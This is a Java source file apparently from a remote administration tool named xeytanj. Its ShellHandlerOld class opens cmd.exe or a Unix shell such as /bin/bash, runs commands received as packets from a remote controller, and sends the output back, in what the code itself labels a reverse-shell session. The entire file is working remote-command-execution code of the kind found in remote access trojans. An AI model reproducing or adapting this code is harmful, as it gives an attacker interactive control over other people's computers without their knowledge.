package com.melardev.xeytanj.services;

import com.melardev.xeytanj.IApplication;
import com.melardev.xeytanj.enums.SessionType;
import com.melardev.xeytanj.logger.ConsoleLogger;
import com.melardev.xeytanj.logger.ILogger;
import com.melardev.xeytanj.net.packets.PacketShell;
import com.melardev.xeytanj.remote.PacketHandler;

import java.io.*;
import java.util.concurrent.ArrayBlockingQueue;


public class ShellHandlerOld implements Runnable, PacketHandler<PacketShell> {

    private static final String SENTINEL_EXIT_VALUE = ShellHandlerOld.class.getCanonicalName();
    private final IApplication app;
    private final ArrayBlockingQueue<String> queueCommands;
    private String command;
    private volatile boolean running;
    private BufferedReader isProc;
    private BufferedReader errProc;
    private BufferedWriter osProc;

    private Process proc;
    private ILogger logger;

    public ShellHandlerOld(IApplication application, ConsoleLogger logger) {
        this.app = application;
        queueCommands = new ArrayBlockingQueue<String>(20);
        this.logger = logger;
    }

    @Override
    public void run() {
        logger.traceCurrentMethodName();
        PacketShell packet;
        // Wait the other thread to open cmd session, once it is done we submit commands
        while (osProc == null)
            continue;
        running = true;
        while (running) {
            try {
                if (queueCommands.isEmpty()) {
                    Thread.sleep(1000);
                    continue;
                }

                command = queueCommands.take();
                if (command.equalsIgnoreCase(SENTINEL_EXIT_VALUE))
                    continue; // most likely running is set to false and we break
                osProc.write(command + "\n");
                osProc.flush();
            } catch (IOException e) {
                // The pipe may be closed
                if (!proc.isAlive())
                    break;
                else
                    e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

    }

    @Override
    public void handlePacket(PacketShell packet) {
        logger.trace("Handling " + packet.getPacketShellInstruction());
        if (packet.getPacketShellInstruction() == PacketShell.PacketShellInstruction.STOP) {
            try {
                proc.destroy();
                this.osProc.close();
                this.isProc.close();
                this.errProc.close();

            } catch (IOException e) {
                e.printStackTrace();
            }
            running = false;
            app.onSessionClosed(SessionType.REVERSE_SHELL);
            // Exit the queue which is blocked, waiting for a message
            queueCommands.offer(SENTINEL_EXIT_VALUE);
        } else if (packet.getPacketShellInstruction() == PacketShell.PacketShellInstruction.EXEC) {
            try {
                queueCommands.put(packet.getResult());
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void setLogger(ILogger logger) {
        this.logger = logger;
    }

    public void init() {
        logger.traceCurrentMethodName();
        new Thread(this::openCmdSession, "Terminal Window Thread").start();
        new Thread(this, "Shell handler Thread").start();
    }

    class ErrorShellRetriever implements Runnable {

        private final BufferedReader errProc;

        public ErrorShellRetriever(BufferedReader errProc) {

            this.errProc = errProc;
        }

        public void run() {
            logger.traceCurrentMethodName();
            try {
                while (running) {
                    if (errProc.ready()) {
                        String line;
                        while ((line = errProc.readLine()) != null)
                            app.sendPacket(new PacketShell(PacketShell.PacketShellInstruction.OUT, line + "\n"));
                    }
                }
            } catch (IOException e) {
                if (running) // if false, then it is expected to be here, skip the error message
                    e.printStackTrace();
            }
        }
    }

    private void openCmdSession() {
        logger.traceCurrentMethodName();
        try {
            Runtime rt = Runtime.getRuntime();

            String shellPath = getShellPath();
            if (shellPath == null) return;

            proc = rt.exec(shellPath);
            isProc = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            osProc = new BufferedWriter(new OutputStreamWriter(proc.getOutputStream()));
            errProc = new BufferedReader(new InputStreamReader(proc.getErrorStream()));

            Thread threadError = new Thread(new ErrorShellRetriever(errProc), "errThread");
            threadError.setDaemon(true);
            threadError.start();
            StringBuilder sb = new StringBuilder();
            running = true;
            char[] buffer = new char[4096];
            // readLine will not work for the last line for exampel c:\melardev> because there it does not end with \n
            int bytesRead;
            while ((bytesRead = isProc.read(buffer)) != -1) {

                Thread.sleep(20); //Make the errThread print before if there is errors

                String out = new String(buffer, 0, bytesRead);

                app.sendPacket(new PacketShell(PacketShell.PacketShellInstruction.OUT, out));

                sb.setLength(0);
            }

        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

    }

    private static String getShellPath() {
        String os = System.getProperty("os.name").toLowerCase();
        if (os.startsWith("windows"))
            return "cmd.exe";
        else {
            String[] shellLocations = {
                    "/bin/bash", "/bin/sh", "/bin/csh", "/bin/ksh"
            };
            for (String shellLocation : shellLocations) {
                File shell = new File(shellLocation);
                if (shell.exists())
                    return shell.getAbsolutePath();
            }
        }
        return null;
    }
}
